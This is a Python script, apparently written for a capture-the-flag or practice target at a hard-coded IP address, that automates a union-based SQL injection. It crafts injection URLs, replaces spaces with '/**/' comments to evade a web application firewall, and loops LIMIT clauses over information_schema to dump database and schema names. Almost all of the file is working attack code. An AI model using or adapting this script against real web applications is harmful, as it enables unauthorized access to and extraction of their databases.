# coding:utf-8
# author:UncleHenry
import requests
from bs4 import BeautifulSoup
import regex as re


def getContent(xurl):
	'''
	@IN:SOUP soup
	@OUT:STR extracted content

	
	#print('soup:'+str(soup))
	'''
	HEADER = {
		'Connection': 'keep-alive',
		'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
	}
	SQLI_user_URL = 'http://47.96.138.65:45787/?id=1-1/**/union/**/select/**/database(),1,version(),user()'
	if xurl != None:
		SQLI_user_URL = xurl
		
	session = requests.Session()
	s0 = session.get(SQLI_user_URL)
	soup = BeautifulSoup(s0.content, 'html.parser')
	#可以用print(soup.find_all('center')[len(soup.find_all('center'))-1]) #找到最后一个center，比较特殊
	#print(soup.prettify)
	#用正则，取出最后一个<center>标签中的内容
	m = re.findall(r'<center>(.+?)</center>',str(soup))
	return(m[len(m)-1])
	
	
	
def fuzz_Url(xbasic_url):
	'''
	@IN: str BASIC_URL, like 
	'?id=1-1/**/union/**/select/**/database(),1,version(),'
	@OUT: str FUZZING_URL, like	
	'union/**/SELECT/**/table_schema/**/FROM/**/information_schema.tables'
	return a completed fuzzing URL
	'''
	#fuzz_ITEM = ['database','@@version','user()']
	fuzz_ITEM = ['table_schema']
	fuzz_RANGE = ['information_schema.tables','information_schema.columns']
	return(xbasic_url+' '+fuzz_ITEM[0]+' '+'from'+' '+fuzz_RANGE[0])




def limit_to_fetch_all(n):
	'''
	递归调用
	@IN：int n: STARTS AT 0
	
	@OUT:str: limit n,n+1 --
	'''
	limit = ' limit '+str(n)+','+str(n+1)+' --'
	return(limit)
	#return(' limit '+str(n)+','+str(n+1)+' --')
	# limit n,n+1
	
	
def trim(xstr):
	'''
	bypass waf
	could be DIY
	'''
	return(xstr.replace(" ", "/**/"))



if __name__ == "__main__":

	BASIC_URL = 'http://47.96.138.65:45787/?id=1-1/**/union/**/select/**/database(),1,version(),'
	#print(getContent(visitSite()))
	print("----OK, let's start----")
	for i in range(20):
		xurl = trim(fuzz_Url(BASIC_URL)+limit_to_fetch_all(i))
		try:
			res = getContent(xurl)
			print(res)
		
		except:
			print("----That's all----")
			break
			


	
	
	


